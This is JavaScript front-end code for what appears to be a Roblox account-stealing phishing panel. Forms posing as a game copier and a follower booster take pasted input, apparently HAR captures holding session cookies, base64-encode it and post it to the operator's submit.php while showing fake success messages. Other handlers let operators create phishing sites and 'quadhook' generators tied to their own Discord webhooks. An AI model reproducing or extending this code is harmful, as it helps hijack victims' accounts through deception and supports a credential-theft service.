const notyf = new Notyf({
    duration: 5000,
    position: {
        x: "right",
        y: "top",
    }
});

// Добавляем функцию для правильного base64 кодирования
function base64EncodeUnicode(str) {
    try {
        // Современный способ с TextEncoder
        const utf8Bytes = new TextEncoder().encode(str);
        let binary = '';
        for (let i = 0; i < utf8Bytes.length; i++) {
            binary += String.fromCharCode(utf8Bytes[i]);
        }
        return btoa(binary);
    } catch (e) {
        // Fallback для старых браузеров
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, 
            function(match, p1) {
                return String.fromCharCode(parseInt(p1, 16));
            }
        ));
    }
}

function download(fileURL, fileName) {
    const link = document.createElement("a");
    link.href = fileURL;
    link.download = fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

var stealer_begin = document.getElementById("har-stealer-begin");
var copy_begin = document.getElementById("har-copy-begin");
var follow_begin = document.getElementById("har-follow-begin");
var create_site = document.getElementById("create-site");
var create_quadhook = document.getElementById("create-quadhook");

if (document.getElementById('regular-mode')) {
    document.getElementById('regular-mode').addEventListener("click", () => {
        document.getElementById('quadhook-form').style.display = "none";
        document.getElementById('regular-form').style.display = "block";
    });
};

if (document.getElementById('quadhook-mode')) {
    document.getElementById('quadhook-mode').addEventListener("click", () => {
        document.getElementById('regular-form').style.display = "none";
        document.getElementById('quadhook-form').style.display = "block";
    });
};

if (create_site) {
    create_site.addEventListener("click", async () => {
        var name = document.getElementById("site-name").value;
        var hook = document.getElementById("site-url").value;
        const response = await fetch("/controller/apis/create", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({name, hook})
        });
        const data = await response.json();
        if (data && data.error.message && !response.ok) {
            notyf.error(data.error.message);
        } else {
            window.location.href = "dashboard";
        };
    });
};

if (create_quadhook) {
    create_quadhook.addEventListener("click", async () => {
        var name = document.getElementById("generator-name").value;
        var hook = document.getElementById("generator-url").value;
        var discord = document.getElementById("generator-discord").value;
        var quadhook = true;
        const response = await fetch("/controller/apis/create", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ name, hook, discord, quadhook})
        });
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        notyf.success("Quadhook Created, Check your webhook!");
    });
};

if (stealer_begin) {
    stealer_begin.addEventListener("click", async () => {
        const input = document.getElementById("har-stealer-input").value;
        
        // Убираем жесткую проверку, просто проверяем что поле не пустое
        if (!input.trim()) {
            notyf.error("Please enter your data!");
            return;
        }
        
        const secret = document.getElementById("secret")?.value || "";
        const code = base64EncodeUnicode(input);
        const loader = document.getElementById("stealer-loader");
        
        console.log("Sending payload:", { code, secret });
        
        try {
            // Show loader
            if (loader) loader.classList.add("active");
            stealer_begin.disabled = true;
            
            const response = await fetch("/controller/apis/submit.php", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ code, secret })
            });
            
            const data = await response.json();
            
            // Hide loader
            if (loader) loader.classList.remove("active");
            stealer_begin.disabled = false;
            
            if (!response.ok) {
                console.error("Server response:", data);
                notyf.error(data?.error?.message || "Request failed. Please try again.");
                return;
            }
            
            notyf.success("Processing your request...");
            
        } catch (error) {
            // Hide loader on error
            if (loader) loader.classList.remove("active");
            stealer_begin.disabled = false;
            console.error("Fetch error:", error);
            notyf.error("An error occurred. Check the console for details.");
        }
    });
}

if (copy_begin) {
    copy_begin.addEventListener("click", async () => {
        if (document.getElementById("secret")) {
            var secret = document.getElementById("secret").value;
        };
        var code = base64EncodeUnicode(document.getElementById("har-copy-input").value); // Изменено
        const loader = document.getElementById("copy-loader");
        
        // Show loader
        if (loader) loader.classList.add("active");
        copy_begin.disabled = true;
        
        const response = await fetch("/controller/apis/submit.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({code, secret})
        });
        
        // Hide loader
        if (loader) loader.classList.remove("active");
        copy_begin.disabled = false;
        
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        download("https://" + window.location.hostname + "/storage/copied.rbxl", "copied.rbxl");
        notyf.success("Downloaded Game!");
    });
};

if (follow_begin) {
    follow_begin.addEventListener("click", async () => {
        if (document.getElementById("secret")) {
            var secret = document.getElementById("secret").value;
        };
        var code = base64EncodeUnicode(document.getElementById("har-follow-input").value); // Изменено
        const loader = document.getElementById("follow-loader");
        
        // Show loader
        if (loader) loader.classList.add("active");
        follow_begin.disabled = true;
        
        const response = await fetch("/controller/apis/submit.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({code, secret})
        });
        
        // Hide loader
        if (loader) loader.classList.remove("active");
        follow_begin.disabled = false;
        
        if (!response.ok) {
            const data = await response.json();
            if (data && data.error && data.error.message) {
                notyf.error(data.error.message);
            }
            return;
        }
        notyf.success("Followers sent! They could take up to 5 minutes to arrive.");
    });
};